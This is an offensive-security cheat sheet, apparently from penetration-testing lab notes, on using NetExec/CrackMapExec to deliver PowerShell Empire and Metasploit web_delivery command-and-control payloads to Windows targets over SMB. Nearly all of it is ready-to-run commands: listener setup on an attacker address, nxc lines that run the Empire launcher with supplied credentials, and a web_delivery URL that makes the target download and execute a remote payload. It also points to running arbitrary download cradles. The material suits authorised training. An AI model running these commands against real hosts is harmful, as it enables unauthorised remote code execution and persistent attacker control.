# 06.04 C2 Integration Empire Metasploit

> Bridge NetExec to PowerShell Empire (`empire_exec`) or Metasploit (`web_delivery`) for staged C2 payload delivery.

## Overview

CME integrates with PowerShell Empire via the `empire_exec` module and Metasploit via the `web_delivery` module. Empire requires configuring `~/.cme/cme.conf` with API credentials. Metasploit's `web_delivery` module generates a URL that CME passes as a parameter. Alternative: use `-X` with `--no-output` to execute a download cradle for any C2.

## Steps

- Configure `~/.cme/cme.conf` `[Empire]` section: api_host, api_port, username, password.
- Start Empire server: `poetry run python empire.py server --username empireadmin --password HackTheBoxCME!`
- Set up Empire HTTP listener with desired host/port before running empire_exec.
- For Metasploit: configure `exploit/multi/script/web_delivery` (target 2, x64 payload) and `run -j` to get URL.
- `web_delivery` module option `URL=<msf_url>`; `PAYLOAD=64` or `PAYLOAD=32` for architecture.
- For other C2: use `-X '<download_cradle>'` with `--no-output` to background the execution.

## Commands

### Empire listener setup

```text
(Empire: uselistener/http) > set Host http://10.10.14.33
```

### Empire listener port

```text
(Empire: uselistener/http) > set Port 8001
```

### Execute Empire launcher via CME

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -M empire_exec -o LISTENER=http
```

### Metasploit web_delivery setup

```text
msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.33
```

### Metasploit web_delivery run

```text
msf6 exploit(multi/script/web_delivery) > run -j
```

### Execute Metasploit web_delivery via CME

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS
```
